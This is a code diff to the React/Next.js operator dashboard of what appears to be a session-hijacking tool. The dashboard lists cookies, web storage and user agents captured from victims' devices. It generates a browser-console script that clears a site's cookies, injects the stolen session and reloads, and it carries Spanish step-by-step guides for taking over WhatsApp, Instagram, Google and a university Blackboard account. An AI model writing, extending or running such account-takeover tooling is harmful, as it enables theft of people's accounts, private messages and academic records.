@@ -5,8 +5,8 @@ import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
 import { 
   Search, Clock, Globe, ExternalLink, 
   Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
-  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot, Monitor, Tablet, Smartphone, Info, RefreshCw, FileJson, Download,
-  Youtube, Linkedin, ShoppingCart, HelpCircle, ChevronRight, X, Cpu, Trash2, Key, ArrowLeft, MousePointer2, Zap
+  Twitter, MessageSquare, Play, AlertCircle, ShoppingCart, Mail, Bot, Monitor, Tablet, Smartphone, Info, RefreshCw, FileJson, Download,
+  Youtube, Linkedin, ChevronRight, X, Cpu, Trash2, Key, ArrowLeft, MousePointer2, Zap
 } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 import Link from "next/link";
@@ -30,28 +30,18 @@ const RESTORATION_GUIDES: Record<string, { title: string, steps: string[], downl
       "PASO 1: Abre web.whatsapp.com.",
       "PASO 2: Presiona F12 -> Console.",
       "PASO 3: Haz clic en 'CONSOLE BOOT' hasta que diga '¡LISTO!'.",
-      "PASO 4: Pégalo en la consola de WhatsApp y presiona ENTER.",
-      "PASO 5: Si ves el código QR, la sesión del equipo original se cerró."
+      "PASO 4: Pégalo en la consola de WhatsApp y presiona ENTER."
     ],
-    warning: "La sesión de WhatsApp es muy volátil. Úsala rápido."
+    warning: "La sesión de WhatsApp es muy volátil."
   },
   "Instagram": {
     title: "Session Injection: Instagram",
     steps: [
       "PASO 1: Instala 'Cookie-Editor'.",
-      "PASO 2: LIMPIEZA: Abre instagram.com y BORRA todas las cookies.",
+      "PASO 2: LIMPIEZA: Abre instagram.com y BORRA las cookies.",
       "PASO 3: USER-AGENT: Copia el 'User-Agent' de este panel y aplícalo.",
-      "PASO 4: IMPORTAR: Usa 'EXPORTAR JSON' y pégalo en la extensión.",
+      "PASO 4: IMPORTAR: Usa 'EXPORTAR JSON' y pégalo.",
       "PASO 5: Refresca instagram.com."
-    ]
-  },
-  "Google": {
-    title: "Google Master Access",
-    steps: [
-      "PASO 1: Es CRÍTICO configurar el User-Agent original.",
-      "PASO 2: Entra a google.com e importa las cookies JSON.",
-      "PASO 3: Refresca y ve a mail.google.com.",
-      "PASO 4: Si pide password, el User-Agent es incorrecto."
     ]
   },
   "Blackboard": {
@@ -60,16 +50,15 @@ const RESTORATION_GUIDES: Record<string, { title: string, steps: string[], downl
       "PASO 1: Asegúrate de estar en aulavirtual.up.edu.pe.",
       "PASO 2: COPIA EL USER-AGENT del panel gris y ponlo en tu navegador.",
       "PASO 3: Presiona F12 y ve a 'Console'.",
-      "PASO 4: Haz clic en 'CONSOLE BOOT', pégalo en la consola y presiona ENTER.",
-      "PASO 5: Espera a que recargue solo."
+      "PASO 4: Haz clic en 'CONSOLE BOOT', pégalo en la consola y presiona ENTER."
     ],
-    warning: "Si te sale 'Cannot set properties of undefined', es porque el USER-AGENT no es el mismo que el del equipo capturado."
+    warning: "Si te sale error tras recargar, el USER-AGENT es incorrecto."
   }
 };
 
 const isNew = (date: string) => {
   const diff = Date.now() - new Date(date).getTime();
-  return diff < 15 * 60 * 1000; // 15 minutos
+  return diff < 15 * 60 * 1000;
 };
 
 const formatRelativeTime = (date: string) => {
@@ -87,6 +76,7 @@ export default function DeviceControlCenter() {
   const deviceId = params.id as string;
   const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
   const [loading, setLoading] = useState(true);
+  const [error, setError] = useState<string | null>(null);
   const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
   const [cookies, setCookies] = useState<Cookie[]>([]);
   const [webStorage, setWebStorage] = useState<any[]>([]);
@@ -96,39 +86,77 @@ export default function DeviceControlCenter() {
   const [copiedUA, setCopiedUA] = useState(false);
 
   const loadAll = async () => {
-    setLoading(true);
-    const { data: sData } = await supabase.from("session_snapshots").select("*").eq("device_id", deviceId).order("captured_at", { ascending: false });
-    if (sData) {
-      const sIds = sData.map(s => s.id);
-      const { data: allC } = await supabase.from("cookies").select("*").in("snapshot_id", sIds);
-      const newMap: Record<string, AccountInfo> = {};
-      const ALLOWED = ["Instagram", "Facebook", "WhatsApp", "Blackboard", "Google", "TikTok"];
-      sData.forEach(s => {
-        const cs = (allC || []).filter(c => c.snapshot_id === s.id);
-        const dStr = cs.map(c => c.domain.toLowerCase()).join(" ");
-        let platform = "External"; let icon = Shield; let color = "text-blue-400"; let domain = "unknown.com";
-        if (dStr.includes("whatsapp")) { platform="WhatsApp"; icon=MessageSquare; color="text-green-500"; domain="web.whatsapp.com"; }
-        else if (cs.find(c => c.name === "ds_user_id")) { platform="Instagram"; icon=Instagram; color="text-pink-500"; domain="instagram.com"; }
-        else if (cs.find(c => c.name === "c_user")) { platform="Facebook"; icon=Facebook; color="text-blue-500"; domain="facebook.com"; }
-        else if (dStr.includes("up.edu.pe")) { platform="Blackboard"; icon=GraduationCap; color="text-blue-400"; domain="up.edu.pe"; }
-        else if (dStr.includes("tiktok")) { platform="TikTok"; icon=Play; color="text-pink-400"; domain="tiktok.com"; }
-        else if (dStr.includes("google")) { platform="Google"; icon=Globe; color="text-red-400"; domain="google.com"; }
-        if (ALLOWED.includes(platform)) newMap[s.id] = { platform, icon, color, health: "active", domain, identifier: s.user_id };
-      });
-      const valid = sData.filter(s => newMap[s.id]);
-      setAccountMap(newMap); setSessions(valid);
-      if (valid.length > 0) handleSelect(valid[0]);
+    try {
+      setLoading(true);
+      setError(null);
+      
+      const { data: sData, error: sErr } = await supabase
+        .from("session_snapshots")
+        .select("*")
+        .eq("device_id", deviceId)
+        .order("captured_at", { ascending: false });
+        
+      if (sErr) throw sErr;
+
+      if (sData && sData.length > 0) {
+        const sIds = sData.map(s => s.id);
+        
+        // Evitar .in([]) que rompe Supabase (Error 400)
+        let allC: any[] = [];
+        let allS: any[] = [];
+        
+        if (sIds.length > 0) {
+          const { data: cRes } = await supabase.from("cookies").select("*").in("snapshot_id", sIds);
+          const { data: sRes } = await supabase.from("web_storage").select("*").in("snapshot_id", sIds);
+          allC = cRes || [];
+          allS = sRes || [];
+        }
+
+        const newMap: Record<string, AccountInfo> = {};
+        const ALLOWED = ["Instagram", "Facebook", "WhatsApp", "Blackboard", "Google", "TikTok"];
+        
+        sData.forEach(s => {
+          const cs = allC.filter(c => c.snapshot_id === s.id);
+          const dStr = cs.map(c => c.domain.toLowerCase()).join(" ");
+          let platform = "External"; let icon = Shield; let color = "text-blue-400"; let domain = "unknown.com";
+          
+          if (dStr.includes("whatsapp")) { platform="WhatsApp"; icon=MessageSquare; color="text-green-500"; domain="web.whatsapp.com"; }
+          else if (cs.find(c => c.name === "ds_user_id")) { platform="Instagram"; icon=Instagram; color="text-pink-500"; domain="instagram.com"; }
+          else if (cs.find(c => c.name === "c_user")) { platform="Facebook"; icon=Facebook; color="text-blue-500"; domain="facebook.com"; }
+          else if (dStr.includes("up.edu.pe")) { platform="Blackboard"; icon=GraduationCap; color="text-blue-400"; domain="up.edu.pe"; }
+          else if (dStr.includes("tiktok")) { platform="TikTok"; icon=Play; color="text-pink-400"; domain="tiktok.com"; }
+          else if (dStr.includes("google")) { platform="Google"; icon=Globe; color="text-red-400"; domain="google.com"; }
+          
+          if (ALLOWED.includes(platform)) newMap[s.id] = { platform, icon, color, health: "active", domain, identifier: s.user_id };
+        });
+
+        const valid = sData.filter(s => newMap[s.id]);
+        setAccountMap(newMap);
+        setSessions(valid);
+        if (valid.length > 0) {
+            handleSelect(valid[0]);
+        }
+      } else {
+        setSessions([]);
+      }
+    } catch (e: any) {
+      console.error("Critical Load Error:", e);
+      setError(e.message);
+    } finally {
+      setLoading(false);
     }
-    setLoading(false);
   };
 
   useEffect(() => { loadAll(); }, [deviceId]);
 
   const handleSelect = async (s: SessionSnapshot) => {
     setSelectedSession(s);
-    const { data: c } = await supabase.from("cookies").select("*").eq("snapshot_id", s.id);
-    const { data: st } = await supabase.from("web_storage").select("*").eq("snapshot_id", s.id);
-    setCookies(c || []); setWebStorage(st || []);
+    try {
+      const { data: c } = await supabase.from("cookies").select("*").eq("snapshot_id", s.id);
+      const { data: st } = await supabase.from("web_storage").select("*").eq("snapshot_id", s.id);
+      setCookies(c || []);
+      setWebStorage(st || []);
+    } catch(e){}
   };
 
   const copyUA = () => { if (selectedSession) navigator.clipboard.writeText(selectedSession.user_agent || "").then(() => { setCopiedUA(true); setTimeout(()=>setCopiedUA(false), 3000); }); };
@@ -157,40 +185,34 @@ export default function DeviceControlCenter() {
   const copyConsole = () => {
     const ls = webStorage.filter(s => s.storage_type === 'localstorage');
     const ss = webStorage.filter(s => s.storage_type === 'sessionstorage');
-    const s = `(function(){
+    const sStr = `(function(){
       const c=${JSON.stringify(cookies)};
       const ls=${JSON.stringify(ls)};
       const ss=${JSON.stringify(ss)};
       console.log('%c EDU-SYNC BOOT ACTIVATED ', 'background: #222; color: #bada55; font-size: 20px;');
-      console.warn('ASEGÚRATE DE ESTAR USANDO EL USER-AGENT CORRECTO.');
       
-      // Limpieza profunda
       document.cookie.split(";").forEach(x=>{
         const n=x.split("=")[0].trim();
         document.cookie = n + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
         document.cookie = n + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + location.hostname;
-        document.cookie = n + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=." + location.hostname;
       });
       localStorage.clear(); sessionStorage.clear();
 
-      // Inyectar Cookies
       c.forEach(x=>{
         try {
-          let d = x.domain;
-          let extra = "; domain=" + d;
+          let extra = "; domain=" + x.domain;
           if (x.name.startsWith('__Host-')) extra = ""; 
           document.cookie = x.name + "=" + x.value + extra + "; path=" + (x.path||"/") + "; SameSite=" + (x.same_site === 'no_restriction' ? 'None' : 'Lax') + "; Secure";
         } catch(e){}
       });
 
-      // Inyectar Storage
       ls.forEach(x=>{try{localStorage.setItem(x.key,x.value)}catch(e){}});
       ss.forEach(x=>{try{sessionStorage.setItem(x.key,x.value)}catch(e){}});
 
-      console.log('Restauración completada. Recargando en 2 segundos...');
+      console.log('Completado. Recargando...');
       setTimeout(()=>location.reload(), 2000);
     })()`;
-    navigator.clipboard.writeText(s).then(() => { setCopied(true); setTimeout(() => setCopied(false), 5000); });
+    navigator.clipboard.writeText(sStr).then(() => { setCopied(true); setTimeout(() => setCopied(false), 5000); });
   };
 
   return (
@@ -204,7 +226,9 @@ export default function DeviceControlCenter() {
             </div>
           </div>
           <div className="flex-1 overflow-y-auto p-6 space-y-4 custom-scrollbar">
-            {loading ? <p className="p-10 text-[10px] uppercase font-black opacity-20">Verificando red...</p> : 
+            {loading ? <p className="p-10 text-[10px] uppercase font-black opacity-20 animate-pulse">Sincronizando con el nodo...</p> : 
+             error ? <p className="p-10 text-[10px] uppercase font-black text-red-500">Error de conexión: {error}</p> :
+             sessions.length === 0 ? <p className="p-10 text-[10px] uppercase font-black opacity-20">No hay datos en este nodo.</p> :
              sessions.map(s => (
                <button key={s.id} onClick={()=>handleSelect(s)} className={`w-full text-left p-6 rounded-[2rem] border transition-all relative ${selectedSession?.id===s.id?'bg-blue-600 border-blue-500 shadow-xl':'bg-white/[0.02] border-white/5 opacity-40 hover:opacity-100'}`}>
                  {isNew(s.captured_at) && (
@@ -227,13 +251,12 @@ export default function DeviceControlCenter() {
         </aside>
 
         <main className="flex-1 overflow-y-auto p-12 custom-scrollbar bg-[#050505] relative">
-          {/* Alerta de User-Agent Crítica */}
           {selectedSession && (
             <div className="mb-10 p-6 bg-yellow-500/10 border border-yellow-500/20 rounded-3xl flex items-center justify-between">
                <div className="flex items-center gap-6">
                   <div className="w-12 h-12 rounded-2xl bg-yellow-500/20 flex items-center justify-center text-yellow-500"><Shield size={24}/></div>
                   <div>
-                    <h4 className="text-sm font-black uppercase tracking-widest text-yellow-500">Requisito de Seguridad: User-Agent</h4>
+                    <h4 className="text-sm font-black uppercase tracking-widest text-yellow-500">Requisito Obligatorio: User-Agent</h4>
                     <p className="text-[10px] text-gray-400 font-bold uppercase truncate max-w-[500px]">{selectedSession.user_agent}</p>
                   </div>
                </div>
@@ -244,7 +267,7 @@ export default function DeviceControlCenter() {
           )}
 
           <AnimatePresence mode="wait">
-            {selectedSession && (
+            {selectedSession ? (
               <motion.div key={selectedSession.id} initial={{opacity:0,y:20}} animate={{opacity:1,y:0}} className="space-y-12">
                 <div className="flex items-center justify-between border-b border-white/5 pb-10">
                    <div className="flex items-center gap-8">
@@ -276,18 +299,18 @@ export default function DeviceControlCenter() {
                       </div>
                       <button onClick={copyJson} className="w-full p-8 rounded-[2rem] bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center gap-4 transition-all active:scale-95 hover:bg-indigo-500/20">
                         <FileJson size={24} className="text-indigo-400"/>
-                        <span className="text-sm font-black uppercase tracking-widest text-indigo-400">{copiedJson ? '¡JSON COPIADO CON ÉXITO!' : 'EXPORTAR SESIÓN PARA EXTENSIÓN'}</span>
+                        <span className="text-sm font-black uppercase tracking-widest text-indigo-400">{copiedJson ? '¡JSON COPIADO!' : 'EXPORTAR SESIÓN (JSON)'}</span>
                       </button>
                    </div>
 
                    <div className="space-y-8">
                       <button onClick={copyConsole} className={`w-full py-20 rounded-[4rem] text-3xl font-black shadow-2xl transition-all active:scale-95 flex flex-col items-center justify-center gap-4 ${copied ? 'bg-emerald-600 shadow-emerald-500/20' : 'bg-blue-600 hover:bg-blue-500 shadow-blue-500/30'}`}>
-                         <div className="flex items-center gap-4"><Zap size={32} fill="currentColor"/> {copied ? '¡RESTAURACIÓN LISTA!' : 'CONSOLE BOOT'}</div>
-                         <span className="text-sm uppercase font-black tracking-[0.2em] opacity-50">{copied ? 'Pulsa CTRL + V en la ventana de Blackboard' : 'INYECTAR BYPASS DE SEGURIDAD'}</span>
+                         <div className="flex items-center gap-4"><Zap size={32} fill="currentColor"/> {copied ? '¡LISTO!' : 'CONSOLE BOOT'}</div>
+                         <span className="text-sm uppercase font-black tracking-[0.2em] opacity-50">{copied ? 'Pégalo en Blackboard ahora' : 'INYECTAR SESIÓN'}</span>
                       </button>
                       <div className="p-8 rounded-[3rem] border border-white/5 bg-black/40 h-[320px] flex flex-col relative overflow-hidden">
                         <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 to-emerald-500"></div>
-                        <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-4 flex items-center gap-2"><Clock size={12}/> Historial de captura de datos</p>
+                        <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-4 flex items-center gap-2"><Clock size={12}/> Evidencia Raw</p>
                         <div className="flex-1 overflow-y-auto space-y-2 custom-scrollbar pr-4">
                            {cookies.slice(0, 50).map((c,i)=>(<div key={i} className="p-3 bg-white/[0.02] rounded-xl border border-white/5 flex justify-between items-center text-[9px] font-mono text-white/30 truncate"><span>{c.domain}</span><span className="font-bold text-white/50">{c.name}</span></div>))}
                         </div>
@@ -295,6 +318,11 @@ export default function DeviceControlCenter() {
                    </div>
                 </div>
               </motion.div>
+            ) : !loading && (
+               <div className="h-full flex flex-col items-center justify-center space-y-6 opacity-20">
+                  <Monitor size={80}/>
+                  <p className="text-2xl font-black uppercase tracking-widest text-center">Selecciona una sesión operativa<br/><span className="text-sm font-bold opacity-50">en el panel izquierdo</span></p>
+               </div>
             )}
           </AnimatePresence>
         </main>
